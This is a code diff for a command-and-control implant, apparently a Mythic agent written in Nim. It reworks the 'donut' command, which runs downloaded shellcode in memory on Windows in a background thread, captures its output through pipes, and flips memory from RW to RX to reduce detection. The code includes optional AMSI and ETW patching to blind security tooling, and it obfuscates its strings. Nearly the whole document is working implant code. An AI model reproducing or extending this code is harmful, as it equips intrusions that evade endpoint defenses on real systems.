@@ -2,7 +2,7 @@ import ../utils/m_responses
 import ../utils/debug
 import ../utils/strenc
 import ../global_data
-import std/[json, base64, strformat]
+import std/[json, base64, strformat, times]
 
 when defined(windows):
   import winim/lean
@@ -97,27 +97,124 @@ proc processDonutChunk*(taskId: string, params: JsonNode, chunkData: string,
   else:
     return mythicError(taskId, obf("donut command is only available on Windows"))
 
+when defined(windows):
+  type
+    DonutExecState = object
+      active: bool
+      hThread: HANDLE
+      stdoutRead: HANDLE
+      stderrRead: HANDLE
+      stdoutWrite: HANDLE
+      stderrWrite: HANDLE
+      originalStdout: HANDLE
+      originalStderr: HANDLE
+      pShellcode: pointer
+      shellcodeLen: int
+      assemblyName: string
+      capturedOutput: string
+      capturedStderr: string
+      patchOutput: string  # AMSI/ETW patch messages
+      deadline: float  # epochTime deadline
+
+  var donutExecState: DonutExecState
+
+  proc drainPipes(state: var DonutExecState) =
+    ## Non-blocking drain of stdout/stderr pipes
+    var buffer: array[4096, char]
+    var bytesRead: DWORD
+    var bytesAvail: DWORD
+    
+    while PeekNamedPipe(state.stdoutRead, nil, 0, nil, addr bytesAvail, nil) != 0 and bytesAvail > 0:
+      let toRead = min(bytesAvail.int, 4096).DWORD
+      if ReadFile(state.stdoutRead, addr buffer[0], toRead, addr bytesRead, nil) != 0 and bytesRead > 0:
+        for i in 0..<bytesRead:
+          state.capturedOutput.add(buffer[i])
+      else:
+        break
+    
+    while PeekNamedPipe(state.stderrRead, nil, 0, nil, addr bytesAvail, nil) != 0 and bytesAvail > 0:
+      let toRead = min(bytesAvail.int, 4096).DWORD
+      if ReadFile(state.stderrRead, addr buffer[0], toRead, addr bytesRead, nil) != 0 and bytesRead > 0:
+        for i in 0..<bytesRead:
+          state.capturedStderr.add(buffer[i])
+      else:
+        break
+
+  proc cleanupDonutExec(state: var DonutExecState) =
+    ## Clean up all handles and restore stdout/stderr
+    CloseHandle(state.stdoutWrite)
+    CloseHandle(state.stderrWrite)
+    SetStdHandle(STD_OUTPUT_HANDLE, state.originalStdout)
+    SetStdHandle(STD_ERROR_HANDLE, state.originalStderr)
+    # Final drain after closing write ends
+    drainPipes(state)
+    CloseHandle(state.stdoutRead)
+    CloseHandle(state.stderrRead)
+    CloseHandle(state.hThread)
+    discard VirtualFree(state.pShellcode, 0, MEM_RELEASE)
+    state.active = false
+
+proc checkDonutExecution*(taskId: string): JsonNode =
+  ## Called each main loop iteration to poll the donut thread and drain output.
+  when defined(windows):
+    if not donutExecState.active:
+      return nil
+    
+    # Drain pipes to prevent write blocking
+    drainPipes(donutExecState)
+    
+    # Check if thread finished (0ms wait = non-blocking check)
+    let waitResult = WaitForSingleObject(donutExecState.hThread, 0)
+    
+    if waitResult == WAIT_OBJECT_0:
+      # Thread completed
+      var output = donutExecState.patchOutput
+      output.add(obf("[+] Donut shellcode executed successfully for ") & donutExecState.assemblyName & obf("\n"))
+      cleanupDonutExec(donutExecState)
+      if donutExecState.capturedOutput.len > 0:
+        output.add(obf("\n--- stdout ---\n") & donutExecState.capturedOutput)
+      if donutExecState.capturedStderr.len > 0:
+        output.add(obf("\n--- stderr ---\n") & donutExecState.capturedStderr)
+      return mythicSuccess(taskId, output)
+    
+    # Check timeout
+    if epochTime() >= donutExecState.deadline:
+      discard TerminateThread(donutExecState.hThread, 0)
+      var output = donutExecState.patchOutput
+      output.add(obf("[!] Donut shellcode execution timed out\n"))
+      cleanupDonutExec(donutExecState)
+      if donutExecState.capturedOutput.len > 0:
+        output.add(obf("\n--- stdout ---\n") & donutExecState.capturedOutput)
+      if donutExecState.capturedStderr.len > 0:
+        output.add(obf("\n--- stderr ---\n") & donutExecState.capturedStderr)
+      return mythicSuccess(taskId, output)
+    
+    # Still running, nothing to report yet
+    return nil
+  else:
+    return nil
+
 proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
-  ## Execute the downloaded donut shellcode
-  ## This is called after the shellcode download is complete
+  ## Launch donut shellcode in a background thread with pipe-based output capture.
+  ## Returns "processing" status immediately; checkDonutExecution polls for completion.
   when defined(windows):
     try:
       let args = to(params, DonutArgs)
       
       debug &"[DEBUG] Executing donut shellcode ({shellcode.len} bytes)"
       
-      var output = ""
+      var patchOutput = ""
       
       # Patch AMSI if requested
       if args.patch_amsi_arg:
         let res = patchAMSI()
         case res
         of 0:
-          output.add(obf("[+] AMSI patched successfully\n"))
+          patchOutput.add(obf("[+] AMSI patched successfully\n"))
         of 1:
-          output.add(obf("[-] Failed to patch AMSI\n"))
+          patchOutput.add(obf("[-] Failed to patch AMSI\n"))
         of 2:
-          output.add(obf("[+] AMSI already patched\n"))
+          patchOutput.add(obf("[+] AMSI already patched\n"))
         else:
           discard
       
@@ -126,11 +223,11 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
         let res = patchETW()
         case res
         of 0:
-          output.add(obf("[+] ETW patched successfully\n"))
+          patchOutput.add(obf("[+] ETW patched successfully\n"))
         of 1:
-          output.add(obf("[-] Failed to patch ETW\n"))
+          patchOutput.add(obf("[-] Failed to patch ETW\n"))
         of 2:
-          output.add(obf("[+] ETW already patched\n"))
+          patchOutput.add(obf("[+] ETW already patched\n"))
         else:
           discard
       
@@ -140,26 +237,52 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
       
       debug &"[DEBUG] Donut: Allocating {shellcode.len} bytes for shellcode"
       
-      # Allocate executable memory
+      # Allocate memory
       let pShellcode = VirtualAlloc(
         nil,
         SIZE_T(shellcode.len),
         MEM_COMMIT or MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
+        PAGE_READWRITE
       )
       
       if pShellcode == nil:
         let err = GetLastError()
-        return mythicError(taskId, obf("Failed to allocate memory for shellcode: VirtualAlloc failed with error") & $err & " " & obf("(size: ") & $shellcode.len & obf(" bytes)"))
+        return mythicError(taskId, obf("VirtualAlloc failed: ") & $err)
       
-      debug &"[DEBUG] Donut: Memory allocated, copying shellcode"
-      
-      # Copy shellcode to allocated memory
       copyMem(pShellcode, unsafeAddr shellcode[0], shellcode.len)
       
-      debug "[DEBUG] Donut: Creating execution thread"
+      # RW -> RX
+      var oldProtect: DWORD
+      if VirtualProtect(pShellcode, SIZE_T(shellcode.len),
+                        PAGE_EXECUTE_READ, addr oldProtect) == 0:
+        let err = GetLastError()
+        discard VirtualFree(pShellcode, 0, MEM_RELEASE)
+        return mythicError(taskId, obf("VirtualProtect failed: ") & $err)
       
-      # Create thread to execute shellcode
+      # Create pipes for output capture
+      var stdoutRead, stdoutWrite: HANDLE
+      var stderrRead, stderrWrite: HANDLE
+      var sa: SECURITY_ATTRIBUTES
+      sa.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
+      sa.bInheritHandle = 1
+      sa.lpSecurityDescriptor = nil
+      
+      if CreatePipe(addr stdoutRead, addr stdoutWrite, addr sa, 0) == 0:
+        discard VirtualFree(pShellcode, 0, MEM_RELEASE)
+        return mythicError(taskId, obf("Failed to create stdout pipe"))
+      if CreatePipe(addr stderrRead, addr stderrWrite, addr sa, 0) == 0:
+        CloseHandle(stdoutRead)
+        CloseHandle(stdoutWrite)
+        discard VirtualFree(pShellcode, 0, MEM_RELEASE)
+        return mythicError(taskId, obf("Failed to create stderr pipe"))
+      
+      # Redirect stdout/stderr to pipes
+      let originalStdout = GetStdHandle(STD_OUTPUT_HANDLE)
+      let originalStderr = GetStdHandle(STD_ERROR_HANDLE)
+      SetStdHandle(STD_OUTPUT_HANDLE, stdoutWrite)
+      SetStdHandle(STD_ERROR_HANDLE, stderrWrite)
+      
+      # Create execution thread
       var threadId: DWORD
       let hThread = CreateThread(
         nil,
@@ -172,37 +295,40 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
       
       if hThread == 0:
         let err = GetLastError()
+        SetStdHandle(STD_OUTPUT_HANDLE, originalStdout)
+        SetStdHandle(STD_ERROR_HANDLE, originalStderr)
+        CloseHandle(stdoutRead)
+        CloseHandle(stdoutWrite)
+        CloseHandle(stderrRead)
+        CloseHandle(stderrWrite)
         discard VirtualFree(pShellcode, 0, MEM_RELEASE)
-        return mythicError(taskId, obf("Failed to create thread for shellcode execution: CreateThread failed with error ") & $err)
+        return mythicError(taskId, obf("CreateThread failed: ") & $err)
       
-      # Wait for execution with timeout
-      let timeoutMs = if args.timeout > 0: DWORD(args.timeout * 1000) else: 30000  # Default 30s
       let timeoutSec = if args.timeout > 0: args.timeout else: 30
       
-      debug &"[DEBUG] Donut: Waiting for execution to complete (timeout: {timeoutSec}s)"
+      # Store state for polling
+      donutExecState = DonutExecState(
+        active: true,
+        hThread: hThread,
+        stdoutRead: stdoutRead,
+        stderrRead: stderrRead,
+        stdoutWrite: stdoutWrite,
+        stderrWrite: stderrWrite,
+        originalStdout: originalStdout,
+        originalStderr: originalStderr,
+        pShellcode: pShellcode,
+        shellcodeLen: shellcode.len,
+        assemblyName: args.assembly_name,
+        capturedOutput: "",
+        capturedStderr: "",
+        patchOutput: patchOutput,
+        deadline: epochTime() + float(timeoutSec),
+      )
       
-      let waitResult = WaitForSingleObject(hThread, timeoutMs)
+      debug &"[DEBUG] Donut: Thread launched, returning to main loop (timeout: {timeoutSec}s)"
       
-      debug &"[DEBUG] Donut: Wait completed with result: {waitResult}"
-      
-      # Append execution result to output
-      case waitResult:
-      of WAIT_OBJECT_0:
-        output.add(obf("[+] Donut shellcode executed successfully for ") & args.assembly_name & obf("\n"))
-      of WAIT_TIMEOUT:
-        output.add(obf("[!] Donut shellcode execution timed out after ") & $timeoutSec & obf(" seconds\n"))
-        discard TerminateThread(hThread, 0)
-      else:
-        output.add(obf("[+] Donut shellcode execution completed with wait result: ") & $waitResult & obf("\n"))
-      
-      output.add(obf("\nNote: Assembly console output will appear in the agent's stdout/stderr.\n"))
-      output.add(obf("For captured output, use execute-assembly command instead.\n"))
-      
-      # Cleanup
-      CloseHandle(hThread)
-      discard VirtualFree(pShellcode, 0, MEM_RELEASE)
-      
-      return mythicSuccess(taskId, output)
+      # Return processing status - agent stays responsive
+      return mythicProcessing(taskId, patchOutput & obf("Donut shellcode executing in background...\n"))
       
     except Exception as e:
       return mythicError(taskId, obf("Donut execution error: ") & e.msg)
